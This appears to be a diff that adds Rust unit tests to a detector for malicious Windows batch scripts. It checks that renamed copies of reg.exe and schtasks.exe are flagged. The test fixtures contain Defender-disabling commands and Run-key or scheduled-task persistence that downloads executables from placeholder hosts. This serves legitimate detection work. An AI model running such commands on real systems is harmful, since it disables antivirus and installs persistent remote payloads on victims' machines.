@@ -2246,6 +2246,33 @@ C:\Users\Public\rg.tmp add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v
     }
 
     #[test]
+    fn copied_reg_alias_emits_service_disable_defender_evasion_trait() {
+        let script = br#"copy C:\Windows\System32\reg.exe C:\Users\Public\rg.tmp
+C:\Users\Public\rg.tmp add HKLM\SYSTEM\CurrentControlSet\Services\WinDefend /v Start /t REG_DWORD /d 4 /f
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target.eq_ignore_ascii_case(r#"C:\Users\Public\rg.tmp"#)
+            )),
+            "copied reg alias invocation was not tied back to WindowsUtilManip: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DefenderEvasion { action, target }
+                    if action == "service-start-disabled" && target == "WinDefend"
+            )),
+            "copied reg Defender service disable was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn reg_add_run_key_unquoted_data_captures_full_child_command() {
         let script = br#"@echo off
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d cmd.exe /c curl -o out.exe https://reg-unquoted.example/p.exe /f
@@ -2429,6 +2456,34 @@ C:\Users\Public\st.tmp /create /tn "Updater" /tr "cmd /c curl -o out.exe https:/
                         && dst.as_deref() == Some("out.exe")
             )),
             "copied schtasks nested action download missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn copied_schtasks_alias_emits_defender_task_disable_evasion_trait() {
+        let script = br#"copy C:\Windows\System32\schtasks.exe C:\Users\Public\st.tmp
+C:\Users\Public\st.tmp /Change /TN "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target.eq_ignore_ascii_case(r#"C:\Users\Public\st.tmp"#)
+            )),
+            "copied schtasks alias did not emit manipulated execution: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DefenderEvasion { action, target }
+                    if action == "scheduled-task-disable"
+                        && target == r#"\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan"#
+            )),
+            "copied schtasks Defender task disable was not surfaced: {:?}",
             report.traits
         );
     }
